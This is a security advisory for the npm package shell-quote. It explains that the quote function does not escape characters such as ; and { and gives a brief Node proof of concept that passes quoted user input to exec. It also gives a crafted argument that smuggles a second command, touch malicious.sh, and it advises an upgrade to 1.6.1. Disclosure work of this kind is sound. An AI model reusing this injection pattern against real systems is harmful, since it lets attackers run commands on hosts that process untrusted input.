## Overview
[`shell-quote`](https://www.npmjs.com/package/shell-quote) is an npm package used to quote and parse shell commands. 
The `quote` function does not properly escape the following special characters `<`, `>`, `;`, `{`, `}` , and as a result can be used by an attacker to inject malicious shell commands or leak sensitive information.

## Shell command injection proof of concept
Consider the following `poc.js` application

```javascript
var quote = require('shell-quote').quote;
var exec = require('child_process').exec;

var userInput = process.argv[2];

var safeCommand = quote(['echo', userInput]);

exec(safeCommand, function (err, stdout, stderr) {
  console.log(stdout);
});
```

Running the following command will not only print the character `a` as expected, but will also run the another command, i.e `touch malicious.sh`

```bash
$ node poc.js 'a;{touch,malicious.sh}'
```

## Remediation
Upgrade `shell-quote` to version 1.6.1 or greater.

## References
- https://github.com/substack/node-shell-quote/compare/1.6.0...1.6.1
